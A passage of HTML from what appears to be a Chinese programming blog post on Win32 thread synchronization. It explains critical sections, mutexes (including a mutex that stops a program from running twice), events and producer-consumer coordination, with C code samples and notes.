class="line">初始化全局变量：InitializeCriticalSection(&amp;cs);</span><br><span class="line">实现临界区：进入 → EnterCriticalSection(&amp;cs); 离开 → LeaveCriticalSection(&amp;cs);</span><br></pre></td></tr></table></figure><p>注意要init，找了半天错，，，，，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"><span class="keyword">int</span> tickNUM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">        EnterCriticalSection(&amp;cs);</span><br><span class="line">        <span class="keyword">if</span> (tickNUM &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;现在有%d张 &quot;</span>, tickNUM);</span><br><span class="line">            tickNUM--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;还有%d 张\n&quot;</span>, tickNUM);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LeaveCriticalSection(&amp;cs);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        LeaveCriticalSection(&amp;cs);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    InitializeCriticalSection(&amp;cs);</span><br><span class="line">    HANDLE hd,hd1;</span><br><span class="line">    hd = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hd1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//getchar();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h1><p><strong>假设A进程的B线程和C进程的D线程</strong>，同时使用的是内核级的临界资源（<strong>内核对象：线程、文件、进程…<strong>）该怎么让这个访问是安全的？</strong>使用线程锁的方式明显不行，因为线程锁仅能控制同进程中的多线程</strong>。这个时候使用互斥体：</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404132056222.png" alt="image-20220404132056222"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateMutex</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpMutexAttributes,  <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInitialOwner,                       <span class="comment">// initial owner 是否希望互斥体创建出来就有信号，或者说就可以使用，如果希望的话就为FALSE；官方解释为如果该值为TRUE则表示当前进程拥有该互斥体所有权</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                            <span class="comment">// object name 互斥体的名字</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//想要创建出来就有信号，第二个参数给false</span></span><br><span class="line">    HANDLE hs = CreateMutex(<span class="literal">NULL</span>, FALSE, (LPCWSTR)<span class="string">&quot;xyz&quot;</span>);</span><br><span class="line">    WaitForSingleObject(hs, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        Sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ReleaseMutex(hs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="互斥体和线程锁的区别"><a href="#互斥体和线程锁的区别" class="headerlink" title="互斥体和线程锁的区别"></a>互斥体和线程锁的区别</h2><ol><li> 线程锁只能用于单个进程间的线程控制</li><li> 互斥体可以设定等待超时，但线程锁不能</li><li> 线程意外结束时，互斥体可以避免无限等待</li><li> 互斥体效率没有线程锁高</li></ol><h2 id="互斥体防止多开"><a href="#互斥体防止多开" class="headerlink" title="互斥体防止多开"></a>互斥体防止多开</h2><p>防止多开，使用互斥体只是一个方法，<code>ERROR_ALREADY_EXISTS</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hs = CreateMutex(<span class="literal">NULL</span>, <span class="literal">true</span>, (LPCWSTR) <span class="string">&quot;防多开&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hs)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (GetLastError() == ERROR_ALREADY_EXISTS)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;该程序已经开启了，请勿再次开启！&quot;</span>);</span><br><span class="line">            getchar();</span><br><span class="line">            CloseHandle(hs);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            WaitForSingleObject(hs, INFINITE);</span><br><span class="line">            <span class="comment">// 操作资源</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Process: A Thread: B -- %d \n&quot;</span>, i);</span><br><span class="line">                Sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ReleaseMutex(hs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h1><p>事件本身也是一种内核对象，其也是是用来控制线程的。</p><h2 id="通知类型"><a href="#通知类型" class="headerlink" title="通知类型"></a>通知类型</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateEvent</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  LPSECURITY_ATTRIBUTES lpEventAttributes, <span class="comment">// SD 安全属性，包含安全描述符</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bManualReset,                       <span class="comment">// reset type 如果你希望当前事件类型是通知类型则写TRUE，反之FALSE</span></span></span></span><br><span class="line"><span class="params"><span class="function">  BOOL bInitialState,                      <span class="comment">// initial state 初始状态，决定创建出来时候是否有信号，有为TRUE，没有为FALSE</span></span></span></span><br><span class="line"><span class="params"><span class="function">  LPCTSTR lpName                           <span class="comment">// object name 事件名字</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>互斥：只能有一个跑</p><p>通知：全部可以跑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第二个参数，FALSE表示非通知类型通知，也就是互斥；TRUE则表示为通知类型</span></span><br><span class="line"><span class="comment">// 第三个参数表示初始状态没有信号</span></span><br><span class="line">e_event = CreateEvent(<span class="literal">NULL</span>, <span class="literal">true</span>, FALSE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">HANDLE e_event;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 等待事件</span></span><br><span class="line">    WaitForSingleObject(e_event, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ThreadProc - running ...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 等待事件</span></span><br><span class="line">    WaitForSingleObject(e_event, INFINITE);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ThreadProcB - running ...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 第二个参数，FALSE表示非通知类型通知，也就是互斥；TRUE则表示为通知类型</span></span><br><span class="line">    <span class="comment">// 第三个参数表示初始状态没有信号</span></span><br><span class="line">    e_event = CreateEvent(<span class="literal">NULL</span>, <span class="literal">true</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//这里他并没有执行ThreadProc和ThreadProcB</span></span><br><span class="line">    Sleep(<span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置事件为已通知，也就是设置为有信号，之后才跑</span></span><br><span class="line">    SetEvent(e_event);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 等待线程执行结束，销毁内核对象</span></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    CloseHandle(e_event);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><p><strong>线程互斥</strong>：线程互斥是指对于共享的进程系统资源，在各单个线程访问时的排它性；当有若干个线程都要使用某一共享资源时，任何时刻最多只允许一个线程去使用，其它要使用该资源的线程必须等待，直到占用资源者释放该资源。</p><p><strong>线程同步</strong>： 线程同步是指线程之间所具有的一种制约关系，一个线程的执行依赖另一个线程的消息，当它没有得到另一个线程的消息时应等待，直到消息到达时才被唤醒；同步的前提是互斥，其次就是有序，<strong>互斥并不代表A线程访问临界资源后就一定是B线程再去访问，也有可能是A线程，这就是属于无序的状态</strong>，所以同步就是<strong>互斥加上有序</strong>。</p><h3 id="使用互斥体实现"><a href="#使用互斥体实现" class="headerlink" title="使用互斥体实现"></a>使用互斥体实现</h3><p>会有很多cpu时间浪费掉：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 容器</span></span><br><span class="line"><span class="keyword">int</span> container;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 次数</span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 互斥体</span></span><br><span class="line">HANDLE hMutex;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (container==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">            WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">            <span class="comment">// 获取当前进程ID</span></span><br><span class="line">            <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">            <span class="comment">// 生产存放进容器</span></span><br><span class="line">            container = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;++Thread: %d, Build: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            i--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;----------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        ReleaseMutex(hMutex);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (container==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">            WaitForSingleObject(hMutex, INFINITE);</span><br><span class="line">            <span class="comment">// 获取当前进程ID</span></span><br><span class="line">            <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;--Thread: %d, Consume: %d \n&quot;</span>, threadId, container);</span><br><span class="line">            <span class="comment">// 消费</span></span><br><span class="line">            container = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            i--;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;+++++++++++++++\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 释放令牌</span></span><br><span class="line">        ReleaseMutex(hMutex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 创建互斥体</span></span><br><span class="line">    hMutex = CreateMutex(<span class="literal">NULL</span>, FALSE, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    CloseHandle(hMutex);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404141649827.png" alt="image-20220404141649827"></p><p>为了防止cpu时间的浪费，使用事件可以完美解决</p><h3 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 容器</span></span><br><span class="line"><span class="keyword">int</span> container;</span><br><span class="line"><span class="comment">// 次数</span></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">10</span>;</span><br><span class="line">HANDLE eventa, eventb;</span><br><span class="line"><span class="comment">// 生产者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">        WaitForSingleObject(eventa, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        <span class="comment">// 生产存放进容器</span></span><br><span class="line">        container = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;++Thread: %d, Build: %d \n&quot;</span>, threadId, container);</span><br><span class="line"></span><br><span class="line">        SetEvent(eventb);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 消费者</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProcB</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; count; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 等待互斥体，获取令牌</span></span><br><span class="line">        WaitForSingleObject(eventb, INFINITE);</span><br><span class="line">        <span class="comment">// 获取当前进程ID</span></span><br><span class="line">        <span class="keyword">int</span> threadId = GetCurrentThreadId();</span><br><span class="line">        container = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;--Thread: %d, Consume: %d \n&quot;</span>, threadId, container);</span><br><span class="line">        <span class="comment">// 消费</span></span><br><span class="line"></span><br><span class="line">        SetEvent(eventa);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    eventa = CreateEvent(<span class="literal">NULL</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">NULL</span>);</span><br><span class="line">    eventb = CreateEvent(<span class="literal">NULL</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 创建2个线程</span></span><br><span class="line">    HANDLE hThread[<span class="number">2</span>];</span><br><span class="line">    hThread[<span class="number">0</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProc, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    hThread[<span class="number">1</span>] = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadProcB, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    WaitForMultipleObjects(<span class="number">2</span>, hThread, TRUE, INFINITE);</span><br><span class="line">    CloseHandle(hThread[<span class="number">0</span>]);</span><br><span class="line">    CloseHandle(hThread[<span class="number">1</span>]);</span><br><span class="line">    CloseHandle(eventa);</span><br><span class="line">    CloseHandle(eventb);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404142455729.png" alt="image-20220404142455729"></p><h1 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h1><p>内核层也有模块：</p><p><img src="/2022/04/01/%E9%87%8D%E6%8B%BEWin32/image-20220404142900172.png" alt="image-20220404142900172"></p><p>Handle是私有的。</p><p>hwnd是全局的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 